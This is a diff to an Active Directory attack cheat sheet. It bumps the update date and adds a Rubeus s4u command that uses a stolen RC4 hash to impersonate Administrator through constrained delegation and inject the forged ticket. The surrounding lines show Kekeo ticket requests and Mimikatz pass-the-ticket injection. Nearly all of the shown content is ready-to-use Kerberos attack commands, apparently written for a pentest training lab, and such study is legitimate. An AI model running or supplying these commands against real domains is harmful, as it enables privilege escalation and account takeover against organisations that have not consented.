@@ -2,7 +2,7 @@
 
 This cheat sheet contains common enumeration and attack methods for Windows Active Directory with the use of powershell.
 
-Last update: **19 Nov 2021**
+Last update: **20 Nov 2021**
 ## TOC
 - [Pre-requisites](#pre-requisites)
 - [Enumeration](#enumeration)
@@ -552,4 +552,9 @@ tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
 /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
 # Use Mimikatz to inject the TGS
 Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
+```
+**4. With Rubeus:**
+```powershell
+# Requesting TGT and TGS
+.\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<domain>" /ptt
 ```
